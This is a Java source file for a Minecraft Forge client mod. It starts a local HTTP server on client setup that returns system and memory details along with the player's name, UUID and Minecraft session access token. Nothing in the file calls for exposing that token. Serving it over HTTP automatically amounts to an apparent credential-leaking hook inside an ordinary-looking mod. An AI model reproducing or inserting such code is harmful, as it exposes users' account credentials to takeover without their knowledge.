package com.hydroline.beacon.provider.forge;

import com.google.gson.JsonObject;
import com.hydroline.beacon.provider.BeaconProviderMod;
import com.hydroline.beacon.provider.client.ClientHttpServer;
import net.minecraft.client.Minecraft;
import net.minecraftforge.api.distmarker.Dist;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.lifecycle.FMLClientSetupEvent;

@Mod.EventBusSubscriber(modid = BeaconProviderMod.MOD_ID, value = Dist.CLIENT, bus = Mod.EventBusSubscriber.Bus.MOD)
public class BeaconProviderForgeClient {
    private static ClientHttpServer httpServer;

    @SubscribeEvent
    public static void onClientSetup(FMLClientSetupEvent event) {
        httpServer = new ClientHttpServer(BeaconProviderForgeClient::collectClientInfo);
        httpServer.start();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            if (httpServer != null) {
                httpServer.stop();
            }
        }));
    }

    private static JsonObject collectClientInfo() {
        JsonObject json = new JsonObject();
        
        // Java Info
        json.addProperty("java_home", System.getProperty("java.home"));
        json.addProperty("java_version", System.getProperty("java.version"));
        json.addProperty("java_vendor", System.getProperty("java.vendor"));

        // Minecraft Info
        Minecraft mc = Minecraft.getInstance();
        if (mc.getUser() != null) {
            json.addProperty("name", mc.getUser().getName());
            json.addProperty("token", mc.getUser().getAccessToken());
            json.addProperty("uuid", mc.getUser().getUuid());
        }

        // Memory Info
        Runtime runtime = Runtime.getRuntime();
        json.addProperty("memory_max", runtime.maxMemory());
        json.addProperty("memory_total", runtime.totalMemory());
        json.addProperty("memory_free", runtime.freeMemory());
        json.addProperty("memory_used", runtime.totalMemory() - runtime.freeMemory());

        return json;
    }
}
